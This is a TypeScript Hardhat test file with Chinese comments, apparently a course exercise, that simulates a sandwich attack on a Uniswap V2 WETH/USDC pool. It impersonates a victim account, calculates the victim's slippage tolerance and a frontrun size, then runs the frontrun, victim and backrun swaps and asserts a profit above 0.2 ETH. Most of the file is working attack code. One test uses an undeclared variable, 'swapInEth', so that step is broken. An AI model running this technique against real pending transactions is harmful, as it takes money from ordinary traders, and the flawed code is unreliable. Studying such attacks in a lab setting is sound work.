/**
 * 目標: 算出這次三明治攻擊的 frontrunAmount
 */

import hre, { ethers } from 'hardhat';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import poolABI from '../contracts/ABI/UniswapV2.json';
import routerABI from '../contracts/ABI/UniswapV2Router.json';
import ERC20ABI from '../contracts/ABI/ERC20.json';

const { formatUnits, parseUnits, parseEther, formatEther } = require('ethers/lib/utils');

describe('Sandwich Attack', () => {
    let pool: Contract;
    let reserves: { _reserve1: any; _reserve0: any };
    let router: Contract;
    let user: SignerWithAddress;
    let victim: SignerWithAddress;
    let usdc: Contract;
    let weth: Contract;
    let swapUsdcAmount: any;

    let uniswapPoolAddress = '0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc';
    let uniswapRouterAddress = '0xf164fC0Ec4E93095b804a4795bBe1e041497b92a';
    let wethAddress = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
    let usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    let victimAddrrss = '0x70B8753DFC2095d6Df00806cD820c5c73CcB44f7';
    let victimSwapEthAmount = ethers.utils.parseEther('50.0');
    let victimMinReceiveAmount = 9349233457;
    let afterUniswapFee = 0.997;
    let BPS = 10000;

    let originalEth: any;
    let originalUsdc: any;
    let expectUsdcAmountOut: any;
    let slippage: any;

    // This is the frontrun amount you should calculate
    let frontrunAmount: any;

    before(async () => {
        // Prepare contract
        pool = await ethers.getContractAt(poolABI, uniswapPoolAddress);
        usdc = await ethers.getContractAt(ERC20ABI, usdcAddress);
        weth = await ethers.getContractAt(ERC20ABI, wethAddress);
        let accounts = await ethers.getSigners();
        user = accounts[0];
        router = await ethers.getContractAt(routerABI, uniswapRouterAddress);
        await hre.network.provider.request({
            method: 'hardhat_impersonateAccount',
            params: [victimAddrrss],
        });
        victim = await ethers.getSigner(victimAddrrss);
    });

    it('Get pool reserve', async () => {
        /*
            Pool state
            Usdc: 304541921778
            ETH: 1565885176643589859208
            swapInEth: 50000000000000000000

            以上兩個相乘要等於定值
            多了 50 顆 ETH

            Swap 50 ETH should get how much USDC?
            A: 
            x * y = k
            => originalEth * originalUsdc = (originalEth + swapInEth ) * ( originalUsdc - swapOutUsdc )
            => originalEth * originalUsdc / (originalEth + swapInEth ) = ( originalUsdc - swapOutUsdc )
            => swapOutUsdc = originalUsdc - (originalEth * originalUsdc / (originalEth + swapInEth) )
            => swapOutUsdc = 304541921778 - (1565885176643589859208 * 304541921778 / (1565885176643589859208 + 50000000000000000000) )
            => swapOutUsdc = 304541921778 - (476877680978721855488036769031824 / 1615885176643589859208)
            => swapOutUsdc = 304541921778 - 295118544233
            => swapOutUsdc = 9423377545  => 沒抽稅前，，SWAP 50 ETH 預計拿到這麼多 USDC

            9423377545 * 0.997(平台抽千分之3利息) = 9395107412.36 => 無條件捨去為:9395107412

            SWAP 50 ETH 後，預計拿到的USDC數量: 9395107412
        */

        // Get pool reserve data before sandwich
        reserves = await pool.getReserves();

        originalUsdc = reserves._reserve0; // BigNumber { value: "304541921778" }
        originalEth = reserves._reserve1; // BigNumber { value: "1565885176643589859208" }
        victimSwapEthAmount = parseUnits('50', 18); // BigNumber { value: "50000000000000000000" }

        // expectUsdcAmountOut =  (originalUsdc - originalEth * originalUsdc / (originalEth + swapInEth)) * afterUniswapFee  ;
        expectUsdcAmountOut = Math.floor( (Number(originalUsdc.toString()) - (Number(originalEth.toString()) * Number(originalUsdc.toString()) ) / ( Number(originalEth.toString()) + Number(swapInEth.toString())) ) * afterUniswapFee ); // 9395107412 

        console.log(`正常情況，SWAP 50 ETH 預計拿到這麼多USDC: ${expectUsdcAmountOut}`);
    });

    it('Calculate victim allowed slippage', async () => {
        // You should calculate how much slippage the victum tx allowed
        /*
            前一步和這一步，主要是要算受害者接受的滑價
            計算結果：他可以接受千分之五的滑價

            victimMinReceiveAmount = 9349233457;
            usdcAmountOutUnattacked = 9395107412;

            受害人最小接受拿到 => 9349233457顆
            SWAP 50 ETH 後，預計拿到的USDC數量 => 9395107412顆

            受害人接受滑價 = 1 - 受害人最小接受收到數量 / 受害人原先預期收到數量
                          = 1 - 9349233457 / 9395107412
                          = 1 - 0.9951172506
                          = 0.0048827494
            
            代表受害人最高可接受滑價 ~= 0.5% ~= 0.005
        */

        slippage = 1 - victimMinReceiveAmount / expectUsdcAmountOut; // 0.004882749391604269
        // console.log(`Calculate victim allowed slippage: 0.0048827494`);
        console.log(`Calculate victim allowed slippage: ${slippage}`);
    });

    it('Calculate max frontrun amount', async () => {
        // You should calculate how much ETH amount can you frontrun
        /*
            這裡計算frontrunAmount，也就是當你買了多少顆，才會讓他價格上漲接近千分之5

            frontrunAmount ~= originalEth * (slippage / 2)
                           ~= 1565885176643589859208 * (0.005 / 2)
                           ~= 3914712941608974300
        */

        let unmFrontrunAmount = originalEth * (0.005 / 2);
        console.log(`FrontrunAmount: ${unmFrontrunAmount}`); // 3914712941608974300

        // 轉成可帶入uniswap api函數的參數型別: BigNumber
        frontrunAmount = ethers.BigNumber.from(unmFrontrunAmount.toString());
    });

    it('Frontrun', async () => {
        let userUsdcBalanceBefore = await usdc.balanceOf(user.address);
        await router.connect(user).swapExactETHForTokens(
            0, // amountOutMin
            [wethAddress, usdcAddress], //path
            user.address, // to
            1590085691, // deadline
            {
                value: frontrunAmount,
            }
        );
        let userUsdcBalanceAfter = await usdc.balanceOf(user.address);
        swapUsdcAmount = userUsdcBalanceAfter.sub(userUsdcBalanceBefore);
        console.log('USDC swap amount', swapUsdcAmount);
    });

    it('Victim tx', async () => {
        await router.connect(victim).swapExactETHForTokens(
            victimMinReceiveAmount, // amountOutMin
            [wethAddress, usdcAddress], //path
            victimAddrrss, // to
            1590085691, // deadline
            {
                value: victimSwapEthAmount,
            }
        );
    });

    it('sandwich attack success', async () => {
        let userWethBalanceBefore = await weth.balanceOf(user.address);
        await usdc.connect(user).approve(router.address, swapUsdcAmount);
        await router.connect(user).swapExactTokensForTokens(
            swapUsdcAmount, // amountIn
            0, // amountOutMin
            [usdcAddress, wethAddress], //path
            user.address, // to
            1590085691 // deadline
        );
        let userWethBalanceAfter = await weth.balanceOf(user.address);
        let swapWethAmount = userWethBalanceAfter.sub(userWethBalanceBefore);
        let profit = swapWethAmount.sub(frontrunAmount);

        console.log('profit in ETH', ethers.utils.formatEther(profit));
        expect(Number(profit), 'Profit should greater than 0.2 ETH').gt(0.2);
    });
});
